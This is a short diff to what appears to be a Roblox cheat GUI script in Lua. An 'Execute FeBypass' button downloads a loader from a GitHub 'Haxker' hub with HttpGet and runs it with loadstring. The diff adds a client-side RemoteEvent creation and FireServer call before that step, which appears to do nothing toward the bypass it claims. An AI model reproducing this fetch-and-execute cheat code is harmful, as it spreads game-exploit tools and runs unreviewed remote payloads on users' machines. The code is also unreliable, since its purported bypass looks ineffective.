@@ -240,7 +240,12 @@ Instances.FeBypass.Text = "Execute FeBypass"
 Instances.FeBypass.TextSize = 14
 Instances.FeBypass.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
 Instances.FeBypass.MouseButton1Down:Connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/FreeRobloxScripts1/Haxker_6666666-Hub/main/loader'))()
+         local remote = Instance.new("RemoteEvent")
+	 remote.Parent = game.ReplicatedStorage
+	 remote.Name = "fe"
+	 remote:FireServer()
+	 wait(3)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/FreeRobloxScripts1/Haxker_6666666-Hub/main/loader'))()
 end)
 
 local UserInputService = game:GetService("UserInputService")
